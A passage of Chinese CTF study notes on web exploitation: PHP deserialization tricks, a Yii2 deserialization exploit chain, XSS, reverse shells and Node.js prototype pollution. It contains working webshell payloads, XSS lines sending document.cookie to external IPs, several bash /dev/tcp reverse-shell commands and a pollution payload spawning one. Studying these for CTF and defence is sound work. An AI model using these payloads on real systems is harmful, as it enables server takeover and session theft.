- 要构造正确的字符串长度，因为上面红色payload的长度为62。有一个fuck，替换成一个loveu，就占一位，所以需要62个fuck，这样正好是62x4+62=62*5。
- 举个简单的例子：
```php
//15 fuckfuckfucks:1
//15 loveuloveuloveus:1 
这样在前面闭合好之后，s就成功被赋值为了1
```
#### payoload
```php
   $msg1 = new message('fuck/*多少个fuck取决于后面字符串的长度*/";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:5:"admin";}','b','c');
```
### Session序列化选择器漏洞
#### 0x01 知识点

**session_start：**<br />[https://www.php.net/manual/zh/function.session-start.php](https://www.php.net/manual/zh/function.session-start.php)<br />当会话自动开始或者通过 **session_start()** 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 [session_set_save_handler()](https://www.php.net/manual/zh/function.session-set-save-handler.php) 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），** PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量**

**session.serialize_handler：**<br />在php 5.5.4以前默认选择的是php，5.5.4之后就是php_serialize

测试不同处理器的结果：
```php
<?php
session_start();
//ini_set('session.serialize_handler', 'php_serialize');
class User{
    public $username = 'a';
    public $password = 'b';

}
$a = new User;
$_SESSION['user'] = $a;
?>
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669865970532-ecabf1f5-08b7-4ebc-beef-4f0d2815b481.png#averageHue=%23f7f7f8&clientId=uaefec989-846a-4&from=paste&height=287&id=u3811cebd&originHeight=632&originWidth=2359&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91977&status=done&style=none&taskId=uac30700d-03c8-4d20-953f-1d01563dcd1&title=&width=1072.2727040318423)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669866028318-648ce215-7ac5-4377-9232-d2435fb5b053.png#averageHue=%23f6f4f4&clientId=uaefec989-846a-4&from=paste&height=160&id=uf59c19a7&originHeight=353&originWidth=1450&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41227&status=done&style=none&taskId=u6e5d95f6-3cf8-4d4a-a884-13e089f7c74&title=&width=659.0908948054987)

- 这里的值和临时文件名称相同

**默认值为php的结果：**<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669866286583-3ebe2ba6-56cd-4c8d-858f-007349c9ae46.png#averageHue=%23f1f0f0&clientId=uaefec989-846a-4&from=paste&height=40&id=u49c11019&originHeight=89&originWidth=1151&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4725&status=done&style=none&taskId=u766a3ac1-49d9-4a81-aac9-c797ff827bd&title=&width=523.1818068421579)<br />**值为php_serialize的结果**<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669866513480-4c0e2851-9cac-48b0-9d4a-dfc5304b1249.png#averageHue=%23f3f2f1&clientId=uaefec989-846a-4&from=paste&height=48&id=uce124e34&originHeight=106&originWidth=1387&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5290&status=done&style=none&taskId=ue6993c7c-95c3-4df9-baa0-83d1041427a&title=&width=630.4545317898115)
:::info
当读session和写session使用不同的处理器时，就会出现问题。<br />如果写session用的是**php_serialize，且精心构造了一个 | **<br />`a:1:{s:4:"user";O:4:"User":2:{s:8:"username|";s:1:"a";s:8:"password";s:1:"b";}}`<br />读的时候，在开启了session_start，对Php数据进行反序列化，就**会对 | 后的数据进行反序列化**。
:::

#### 例题

- 在index.php中，可以看到1处写错了，因此可以构造`$_SESSION['limit']`的值

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669865526369-f84bd4e4-64b2-4230-9ddd-02775745d6cc.png#averageHue=%23201f1e&clientId=uaefec989-846a-4&from=paste&height=252&id=uf3ec63a4&originHeight=554&originWidth=1949&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119775&status=done&style=none&taskId=u29d53a2e-0dd0-4cb5-b2f8-c5235540971&title=&width=885.9090717075289)

- 在check.php中包含了inc.php

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669866913446-5baf2efd-d0f8-433f-ac02-6e5175b2908a.png#averageHue=%23201f1e&clientId=uaefec989-846a-4&from=paste&height=160&id=u28d0b4b0&originHeight=351&originWidth=1544&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35985&status=done&style=none&taskId=u003b013d-bec3-45f2-8dbf-7d8e6462fe0&title=&width=701.8181666066827)

- 在inc.php中，用php处理器读，和前面不一样，开启了session_start()，会反序列化数据

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669866819050-789983ac-4da0-40c7-bbfb-b1f05052d9e7.png#averageHue=%2321201f&clientId=uaefec989-846a-4&from=paste&height=265&id=uf5401725&originHeight=584&originWidth=1995&originalType=binary&ratio=1&rotation=0&showTitle=false&size=111880&status=done&style=none&taskId=u50907c77-d101-4f00-a040-e69f5a2326a&title=&width=906.8181621634275)

- 且这里可以构造User，用file_put_contents去上传🐎

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669866836718-930b9f6d-ddd5-462e-a883-47a43f235c4a.png#averageHue=%23201e1e&clientId=uaefec989-846a-4&from=paste&height=325&id=ua814e513&originHeight=715&originWidth=1968&originalType=binary&ratio=1&rotation=0&showTitle=false&size=120264&status=done&style=none&taskId=u585a681d-04f7-4132-b454-690446d68a6&title=&width=894.5454351567045)

**综上所述：我在index.php中构造一个带 |  的序列化数据，用Cooike传给session，在访问check.php页面时，由于它包含了inc.php，inc.php中用php处理器读取数据，并session_start()反序列化数据，将index.php中构造的数据注入到file_put_contents函数中。**
```php
<?php
class User{
    public $username;
    public $password;
    public $status;

}
$a = new User("1.php",'<?php eval($_POST[1]);phpinfo();?>');
echo base64_encode("|".serialize($a));
?>
```

- 这里上传马由于没有回显，不知道是否成功，因此加一个Phpinfo。
### 引用传值绕过==
:::info
ctmd

- 我想到赋值，但是没想到引用
:::
#### 引用赋值的序列化
```php
<?php
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = &$this->token;
    }
    public function login(){
        return $this->token===$this->password;
    }
}
$a = new ctfshowAdmin('123','123');
echo serialize($a);
?>
```
可以看到，password的类型为Resource，资源类型<br />**PHP 资源 resource 是一种特殊变量，保存了到外部资源的一个引用**<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669880741234-5e053646-fde5-47e2-a1d3-fc9f67989418.png#averageHue=%231e1e1e&clientId=u838c7201-3aa9-4&from=paste&height=41&id=uc652ba8a&originHeight=91&originWidth=1245&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15168&status=done&style=none&taskId=u20bafb36-5203-45f6-9ed7-371ba3eec8d&title=&width=565.909078643342)

#### 例题
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669881124045-cf051e9a-577a-4855-930a-509887de4f28.png#averageHue=%23fefefe&clientId=u838c7201-3aa9-4&from=paste&height=349&id=ufb405a46&originHeight=768&originWidth=822&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82584&status=done&style=none&taskId=u63741d2e-40a6-46c4-afb2-fb474f0c694&title=&width=373.63635553801373)

- 这里传`O:12:"ctfshowAdmin":2:{s:5:"token";s:3:"123";s:8:"password";R:2;}`

### 快速销毁及大写绕过
#### 0x01
:::info
**知识点1：**<br />**这里测试即使加了'@'也会报错不成功，不知道为啥**<br />原理:当php接收到畸形序列化字符串时，PHP由于其容错机制，依然可以反序列化成功。但是，由于是一个畸形的序列化字符串，那么会立刻触发销毁方法。

知识点2：<br />对于`class ctfshow{}`这个类，反序列化时，可以将类名中的某几个字母大写，也可以正常反序列化。
:::
```php
$b = 'O:7:"CTfshoW":2:{s:8:"username";s:1:"1";s:8:"password";s:1:"2";}';
var_dump(unserialize($b));
//可以正常输出
```
#### 例题
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669885653998-703cfccf-4a78-4ffc-b4ad-f496489b8f1a.png#averageHue=%23fefefd&clientId=u838c7201-3aa9-4&from=paste&height=377&id=udc9fba93&originHeight=829&originWidth=769&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82588&status=done&style=none&taskId=u65d62206-123a-4385-b4a8-c8bc8dbf7df&title=&width=349.54544696926104)

- 传入一个不完整的序列化字符串
### Yii2 反序列化漏洞
#### 0x01 漏洞介绍
[https://www.cnblogs.com/thresh/p/13743081.html](https://www.cnblogs.com/thresh/p/13743081.html)

- 在源码**BatchQueryResult.php**中，1处会调用2处的方法，this->dataReader是它的属性，可以构造，因此找一个dataReader不存在close()，且存在__call魔术方法。

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669954019781-99cd36c0-f1a0-461e-b26f-d6319c83c462.png#averageHue=%231e1e1e&clientId=u74864b3b-660c-4&from=paste&height=454&id=ua9c7d0d3&originHeight=998&originWidth=1956&originalType=binary&ratio=1&rotation=0&showTitle=false&size=115387&status=done&style=none&taskId=u2fdb115f-88e5-4a48-b221-0e4e82d6e80&title=&width=889.090889820383)

- 在Generator.php中，__call会调用format的函数，此时这里的`$method='close',$attributes为空`

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669954157922-21513ee5-2acf-49de-adca-45b88cda3606.png#averageHue=%231e1e1e&clientId=u74864b3b-660c-4&from=paste&height=107&id=uc9dadf52&originHeight=236&originWidth=1144&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29223&status=done&style=none&taskId=u35725041-9f51-40aa-bfd1-011b32ad5ea&title=&width=519.9999887293038)

- 在format函数中，`$formatter = 'close'`，调用getFormatter方法，由于`this->formatters`是可控的，那么getFormatter的返回值就可控。

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669954260104-6dbe5ef9-4cb0-4369-a2ff-b049fe8d018a.png#averageHue=%231f1f1e&clientId=u74864b3b-660c-4&from=paste&height=533&id=u348dd71a&originHeight=1172&originWidth=1644&originalType=binary&ratio=1&rotation=0&showTitle=false&size=205599&status=done&style=none&taskId=u08b70614-b5a9-4a91-bea1-454bff5598c&title=&width=747.2727110760275)

- $arguments是一个空的数组，在call_user_func_array中，下面的代码是可以正常执行的。因此这里就可以任意执行一个无参的函数。
```php
class A{
	public $a = 1;
  function bar(){
    echo $a;
}
call_user_func_array([new A,'bar'],array())
```

- 在所有代码中搜索call_user_func函数，在CreateAction中，`this->checkAccess`是它的属性，`thi->id`是父类的属性，因此可以构造实现任意代码执行。

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669954696096-141cef0f-9c3c-4b24-804d-6450d93a87e7.png#averageHue=%231e1e1e&clientId=u74864b3b-660c-4&from=paste&height=133&id=u9e7f08bb&originHeight=293&originWidth=1649&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33093&status=done&style=none&taskId=u34460b7b-3c70-4a67-80cf-4daeaed5d10&title=&width=749.5454382994947)
#### 0x02 exp

- 需要有一个反序列化的入口
```php
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'shell_exec';
            $this->id = 'echo "<?php echo 3333333;eval($_POST[1]);?>" > /var/www/html/basic/web/3.php';

        }
    }   
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;
        public function __construct(){
            $this->formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace {
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
} 
?>
```
#### 0x03 例题（web267）

- 页面尝试用admin admin成功登录
- 查看源码发现view-source，这里改成`r=site%2Fabout&view-source`

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669954912864-13372d34-72ef-4a84-9311-d85f6c3aff6c.png#averageHue=%23cfcfce&clientId=u74864b3b-660c-4&from=paste&height=255&id=u4d90c3c3&originHeight=562&originWidth=2079&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82403&status=done&style=none&taskId=ud915c615-be00-45c2-a7c7-93a14176aa9&title=&width=944.999979517677)

- 发现反序列化入口，访问`r=backdoor/shell`，传入code，code是上面exp的结果

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669954992458-02f1a329-2d4e-444a-8215-8dc13a65dc95.png#averageHue=%23d8d7d7&clientId=u74864b3b-660c-4&from=paste&height=318&id=u4e3a1497&originHeight=700&originWidth=1957&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97028&status=done&style=none&taskId=u84099b9c-c898-4d81-9e51-8d8fba28d74&title=&width=889.5454352650764)
#### <br />
# 8. Java漏洞
# 9. XSS

- 要想获得flag，需要在服务器上创建x.php，同时需要运行x.php这个程序，`php x.php`（为什么呢？）
## web316
:::info
<script>标签中可以写js的代码
:::
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1671698837465-d25ed447-52f5-4dc8-888f-b3251c53eb6b.png#averageHue=%23faf8f6&clientId=uaede88a3-3ef2-4&from=paste&height=201&id=u93a8658d&originHeight=402&originWidth=2348&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38430&status=done&style=none&taskId=u92a3d528-8ff0-46cd-82d6-8059d1ba6aa&title=&width=1174)

- 这里flag藏在document.cookie中。所以为什么呢？
- 能否直接显示document.cookie呢？发现不行，因此得尝试带出来

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1671698946887-b4d54e1c-d177-4e97-aeda-a221109a5437.png#averageHue=%23fef8f7&clientId=uaede88a3-3ef2-4&from=paste&height=86&id=bQgLU&originHeight=171&originWidth=1258&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24575&status=done&style=none&taskId=ueda47460-1c8d-4fdd-96f9-2fa0a59c8da&title=&width=629)

- 在服务器上创建如下脚本
```php
<?php
$cookie = $_GET['cookie'];
$log = fopen("cookie.txt", "a");
fwrite($log, $cookie . "\n");
fclose($log);
?>

```

- 在生成链接处，让它跳转到我构造的页面x.php，并在cookie.txt中写入document.cookie
```javascript
<script>document.location.href="http://49.233.18.145/x.php?content="+document.cookie</script>
```
:::info
[https://www.cnblogs.com/Qian123/p/5345298.html#_label3](https://www.cnblogs.com/Qian123/p/5345298.html#_label3)<br />document.location.href是跳转的链接。
:::
## web317 绕过<script>
### <body onload>
[Body onload 事件 | 菜鸟教程](https://www.runoob.com/jsref/event-body-onload.html)
:::info
onload中也可以执行js代码，会在显示完页面的内容后，执行
:::
```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"> 
<title>菜鸟教程(runoob.com)</title>
<script>
function load()
{
	alert("页面已经载入！");
}
</script>
</head>

<body onload="load()">
<h1>Hello World!</h1>
</body>

</html>
```

- 代码的执行结果：

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1678067566100-d34b761b-1886-4b57-a41e-8956d1ee1d25.png#averageHue=%23f2f2f1&clientId=u39157e5c-4c6c-4&from=paste&height=339&id=yW9AN&originHeight=677&originWidth=1155&originalType=binary&ratio=2&rotation=0&showTitle=false&size=45963&status=done&style=none&taskId=ubf3c8742-6df7-40b7-8cf4-5d9647e2421&title=&width=577.5)

- payload如下：

```javascript
 <body onload="document.location.href='http://49.233.18.145/x.php?1='+document.cookie"></body>
```
## web 320(绕过空格)

- 把web317的payload的空格改成注释即可
```html
<body/**/onload="location.href='http://119.3.134.252:8002/a.php?cookie='+document.cookie"></body>
```
# 
# 
# 10. nodejs
## 初步-命令执行

- node.js在eval执行命令时，需要先加载模块
```javascript
eval("require("child_process").execSync('ls')")
```
## 绕过md5可以用对象
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1671779600710-1ba90b3f-b445-49bd-a980-4da978f3b59a.png#averageHue=%23fefefe&clientId=u11193094-218b-4&from=paste&height=101&id=u3a9a3517&originHeight=223&originWidth=1283&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31408&status=done&style=none&taskId=ua4650770-27ad-425a-b79d-56069ce2111&title=&width=583.1818055416929)

- 这里要求md5后的值相等，在js中，数组+字符串返回的是字符串
- 而对象+字符串，返回的是`[object Object]flag{xxx}`
- get传递数组的方式和php相同
```javascript
a={'x':'1'}
b={'x':'2'}
console.log(a + "flag{xxx}")
console.log(b + "flag{xxx}")

#[object Object]flag{xxx}
#[object Object]flag{xxx}
```
## 字符串拼接

- %2B是 ＋ 
```javascript
require("child_process")['exe'%2B'cSync']('ls')
```
## 反弹shell详解
[https://xz.aliyun.com/t/2549](https://xz.aliyun.com/t/2549)
### 命令参数的解释

- `**bash -i**`创建一个bash环境
- `**/dev/tcp/ip/port**`实现监听端口和主机的通信
### 交互重定向

- 为了实现交互，我们需要把受害者交互式shell的输出重定向到攻击机上

**最开始：**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1672642462750-d8123258-288c-481a-bbc4-ad01bbd93f42.png#averageHue=%23ededed&clientId=u301ce103-3ac6-4&from=paste&height=288&id=u6e8a1688&originHeight=633&originWidth=1435&originalType=binary&ratio=1&rotation=0&showTitle=false&size=120912&status=done&style=none&taskId=u53f5d349-5098-4459-a4cc-d406d5899c7&title=&width=652.272713135097)

- 这样把受害者机器上的标准输出绑定到了我的服务器上
- 但是还没有完全控制
- 还需要一条这样的命令
```shell
bash -i < /dev/tcp/192.168.146.129/2333
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1672713376216-3936e2ad-ee01-43e4-8760-8cd7858ef063.png#averageHue=%23ececec&clientId=u78f733d3-4a3e-4&from=paste&height=278&id=u212488eb&originHeight=612&originWidth=1437&originalType=binary&ratio=1&rotation=0&showTitle=false&size=120988&status=done&style=none&taskId=u8bbce253-bec0-4f6e-b071-4a297f537f3&title=&width=653.1818040244839)

- 意思是把输入绑定到我的服务器上，让我可以控制输入
- 将上面两条指令结合起来，变成
```shell
bash -i > /dev/tcp/192.168.146.129/2333 0>&1
```

- 先把输出指向服务器，再把标准输入指向标准输出

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1672713473888-5b063ede-7acf-4f3e-aaf5-8f8bc46eac74.png#averageHue=%23efefef&clientId=u78f733d3-4a3e-4&from=paste&height=303&id=u860d4aa2&originHeight=667&originWidth=1515&originalType=binary&ratio=1&rotation=0&showTitle=false&size=129167&status=done&style=none&taskId=u943a128b-1c72-4ce4-bac3-79b4ce50e74&title=&width=688.6363487105727)

- **输入0是由/dev/tcp/192.168.146.129/2333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到/dev/tcp/192.168.156.129/2333上，这就形成了一个回路，实现了我们远程交互式shell 的功能**
:::danger
这里有一个问题，就是我们在受害者机器上依然能看到我们在攻击者机器中执行的指令
:::
解决方法是将标准错误输出也重定向到服务器上
```shell
bash -i > /dev/tcp/192.168.146.129/2333 0>&1 2>&1
```
当然我们也可以执行与之完全等价的指令
```shell
bash -i >& /dev/tcp/192.168.146.129/2333 0>&1
```
## js apply函数
[JavaScript 函数 Apply](https://www.w3school.com.cn/js/js_function_apply.asp)
### 方法重用
通过 apply() 方法，您能够编写用于不同对象的方法。
## JavaScript apply() 方法
apply() 方法与 call() 方法非常相似：<br />在本例中，person 的 fullName 方法被_**应用**_到 person1：
### 实例
```javascript
var person = {
    fullName: function() {
        console.log(this.firstName + " " + this.lastName);
    }
}
var person1 = {
    firstName: "Bill",
    lastName: "Gates",
}
person.fullName.apply(person1);  // 将返回 "Bill Gates"
```
## 带参数的 apply() 方法
apply() 方法接受数组中的参数：
### 实例
```javascript
var person = {
  fullName: function(city, country) {
    return this.firstName + " " + this.lastName + "," + city + "," + country;
  }
}
var person1 = {
  firstName:"Bill",
  lastName: "Gates"
}
person.fullName.apply(person1, ["Oslo", "Norway"]);
```
## 
## 
## 
## 
## 
## 
## 
## 
## 
## 
## 
## js原型链污染
### js创建对象的3种方式
```javascript
<script type="text/javascript">
    // 第一种方式：字面量
    var o1 = {name: 'o1'}
    var o2 = new Object({name: 'o2'})
      // 第二种方式：构造函数
    var M = function (name) { this.name = name; }
    var o3 = new M('o3')
      // 第三种方式：Object.create
    var p = {name: 'p'}
    var o4 = Object.create(p)

　　console.log(o1)　　　　
　　console.log(o2)
　　console.log(o3)
　　console.log(o4)
</script>
```
### 原型链
[https://www.cnblogs.com/chengzp/p/prototype.html](https://www.cnblogs.com/chengzp/p/prototype.html)<br />![](https://cdn.nlark.com/yuque/0/2022/png/29405061/1671936441171-ffa6cc02-34ba-4a9a-895b-3f9bcc2ba82d.png#averageHue=%23fcfcfb&clientId=u7e46794f-c515-4&from=paste&id=PMbiV&originHeight=236&originWidth=589&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u5c6e6c3d-2de5-4b5f-bc8d-86cba52b5d9&title=)
:::info

- 对象的__proto__它的是原型，而原型也是一个对象，也有__proto__属性，原型的__proto__又是原型的原型，就这样可以一直通过__proto__想上找，这就是原型链，当向上找找到Object的原型的时候，这条原型链就算到头了。
:::
```javascript
var M = function (name) { this.name = name; }
var o3 = new M('o3')
console.log(o3.__proto__)
console.log(M.prototype)
console.log(o3.__proto__===M.prototype)//true
```

- 这里M是构造函数,o3是实例，所以o3.__proto__指向object,o3的原型对象的constructor指向构造函数M

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1671936720177-84190df6-db57-4501-ba35-0ab5cdfb5b2a.png#averageHue=%23fefdfc&clientId=u7e46794f-c515-4&from=paste&height=147&id=u1dedb384&originHeight=293&originWidth=537&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33898&status=done&style=none&taskId=u77b4d754-1f02-4b93-be6b-20975ed71b6&title=&width=268.5)
#### 原型对象和实例之间的联系

- 通过一个构造函数创建出来的多个实例，如果都要添加一个方法，给每个实例去添加肯定很麻烦。这时就该用上原型了。在实例的原型上添加一个方法，这个原型的所有实例便都有了这个方法
```javascript
var M = function (name) { this.name = name; }
var o3 = new M('o3')
var o5 = new M()
o3.__proto__.say=furnction(){
   console.log('hello world')
}

o3.say()
o5.say()
```
#### 函数也有__proto__
![](https://cdn.nlark.com/yuque/0/2022/webp/29405061/1671937338054-bbf72e6f-e885-48d3-9afc-2bfebef8820e.webp#averageHue=%23f3f6f3&clientId=u7e46794f-c515-4&from=paste&id=u54534140&originHeight=1015&originWidth=1440&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u09339fed-f372-47c6-8cbd-6be3e350b62&title=)

- 只有函数有prototype,对象是没有的。
- 函数也是有__proto__的，因为函数也是对象。函数的__proto__指向的是Function.prototype。
- 也就是说普通函数是Function这个构造函数的一个实例。
```javascript
var M = function (name) { this.name = name; }
var o3 = new M('o3')
console.log(M.__proto__===Function.prototype)
```
### merge函数的原型链污染
#### 看Key
```javascript
function look(target) {
  // o1 o2 key =1 
    for (let key in target) {
		console.log(key)
    }
}
let o1 = {}
let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
let o3 = {a: 1, "__proto__": {b: 2}}
look(o2)
look(o3)
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1671939108291-a828179f-5f0a-4c56-ae6a-55e41a89fc10.png#averageHue=%23fefefe&clientId=u7e46794f-c515-4&from=paste&height=95&id=u1b70f3f5&originHeight=189&originWidth=781&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9745&status=done&style=none&taskId=ub4a0f1ba-a6c6-4127-865a-ad3fce8ac98&title=&width=390.5)
#### 污染过程
[https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript)
```javascript
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}
let o1 = {}
let o2 = {a: 1, "__proto__": {b: 2}}
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)
```

- 这种情况，因为Key没有__proto__，在执行merge函数时，__proto__已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型。
```javascript
let o1 = {}
let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)
```

- JSON.parse会把字符串转换为js对象，此时认为__proto__是key
- 也就是在执行merge函数时，会`o1[__proto__] = o2[__proto__]`，由于o1是没有__proto__这个key的，所以就会找o1的原型，object，o2有__proto__这个key，所以就改变了object的指向
:::info
**就是o1[__proto__]代表o1的原型，但是o2[__proto__]是值，因为它有__proto__这个Key，拜Json.parse所赐**
:::
### 原型链污染的进一步解释
:::info
上一小节的解释可以得出的结论是，最后只要构造出**{}**  =  ** {query : 1}，**也就是给object中添加了一个query属性。

- 上面因为o1[__proto__] = {}也就是等于object，所以就污染成功
:::
```javascript
function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key];

        }
    }
  }
var user = new function(){
    this.userinfo = new function(){
    this.isVIP = false;
    this.isAdmin = false;
    this.isAuthor = false;     
    };
  }
body=JSON.parse('{"__proto__":{"__proto__":{"query":"123"}}}');
copy(user.userinfo,body);

console.log(user.query);

```
对于这段js代码，我理解的污染过程如下：

- user.userinfo相当于user的子类。
- 遍历oject2中的key，只有一个`__proto__`
- 那么当执行到`object1[key] = object2[key]`这句时，变成了

`user.userinfo[__proto__] = {"__proto__":{"query":"123"}}`

- `user.userinfo[__proto__]  = user`，所以相当于

`user = {"__proto__":{"query":"123"}}`

- **根据上面对于赋值操作的理解，这就相当于给user的__proto__添加了一个属性，为query ,值为123**
- 所以污染成功
## 关于Js原型链污染的新理解
![微信图片编辑_20230429162321.jpg](https://cdn.nlark.com/yuque/0/2023/jpeg/29405061/1682756611270-70cda1e0-3994-4aa1-b6ec-7afb681615a1.jpeg#averageHue=%23cdcbc9&clientId=u10df4e69-9145-4&from=paste&height=1833&id=uecdbeb63&originHeight=1540&originWidth=647&originalType=binary&ratio=2&rotation=90&showTitle=false&size=48290&status=done&style=none&taskId=uc652a0de-49bf-4219-b78e-3cea89cc48c&title=&width=770)
:::info
Object是个构造函数<br />当我们创建一个构造函数时，JavaScript会自动创建一个空对象，并将其赋值给该构造函数的prototype属性。这个空对象的原型对象就是Object.prototype
:::

### 实例1 res.render
![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1671956219211-cff620a9-5615-4a20-b1db-a9077d834119.png#averageHue=%231f1e1e&clientId=uf6a03316-189a-4&from=paste&height=294&id=uc6cd3923&originHeight=587&originWidth=1894&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98207&status=done&style=none&taskId=u6a6d026c-8d55-4536-b843-8d4a84b3931&title=&width=947)

- res.render将渲染的视图发送给客户端，这里如果构造一个query，如果我们能够通过原型污染攻击给它赋任意我们想要的值,就可以进行rce了。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1672716599893-eea1d773-05d5-4c49-8dc0-b41248b9b534.png#averageHue=%231f1e1e&clientId=u78f733d3-4a3e-4&from=paste&height=329&id=uc8d18338&originHeight=723&originWidth=1467&originalType=binary&ratio=1&rotation=0&showTitle=false&size=105254&status=done&style=none&taskId=ucdadbb27-59f3-4c6b-ba9f-646e3acc528&title=&width=666.8181673652873)

- 在login.js中，copy函数存在原型链污染，给了我构造query的机会
```javascript
function copy(object1, object2){
   for (let key in object2) {
       if (key in object2 && key in object1) {
           copy(object1[key], object2[key])
       } else {
           object1[key] = object2[key]
       }
   }
 }
var user ={}
body=JSON.parse('{"__proto__":{"query":"return 123"}}');
copy(user,body);
console.log(query);
```

- 执行这个代码，发现query已经被赋值
#### 加载模块-任意代码执行
[https://h4cking2thegate.github.io/2022/09/27/nodejsVul/](https://h4cking2thegate.github.io/2022/09/27/nodejsVul/)
```javascript
require('child_process').exec('calc');
global.process.mainModule.constructor._load('child_process').exec('calc');
```
#### 反弹shell
```shell
{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/你的公网ip地址/端口 0>&1\"')"}}
```

- 这种写法更具有普适性。
- 在victim主机上执行反弹shell命令，在服务器上用nc监听端口

[nc命令用法举例 - nmap - 博客园](https://www.cnblogs.com/nmap/p/6148306.html)
```shell
nc -lvp 2333
```
### 实例2 ejs模板引擎
#### 具体过程
[[Web/Nodejs]原型链污染EJS模块的利用分析(附源码分析)_車鈊的博客-CSDN博客_ejs原链污染](https://blog.csdn.net/DARKNOTES/article/details/124000520)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1672821668968-1dc06d55-cf2d-4a98-90cf-7dee2109a59f.png#averageHue=%23242321&clientId=u552a2a54-355d-4&from=paste&height=331&id=uae797429&originHeight=728&originWidth=1311&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142891&status=done&style=none&taskId=uec2e912a-cb7b-457f-8954-7f9f685ff41&title=&width=595.9090779931095)

- 检查代码发现用了ejs模板
- ejs 的 renderFile 进入
```javascript
exports.renderFile = function () { ... return tryHandleCache(opts, data, cb); }; 
```

- 跟进 tryHandleCache 函数, 发现一定会进入 handleCache 函数

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1672821698507-e0bd1cb8-d941-4c5b-b6bc-ee690d2a22f5.png#averageHue=%231a1919&clientId=u552a2a54-355d-4&from=paste&id=u901b1172&originHeight=690&originWidth=738&originalType=url&ratio=1&rotation=0&showTitle=false&size=58187&status=done&style=none&taskId=u12470627-0f9a-401d-bf04-392dd6b3de3&title=)

- 跟进 handleCache 函数
```javascript
function handleCache(options, template) { ...     func = exports.compile(template, options); ... } 
```
:::info
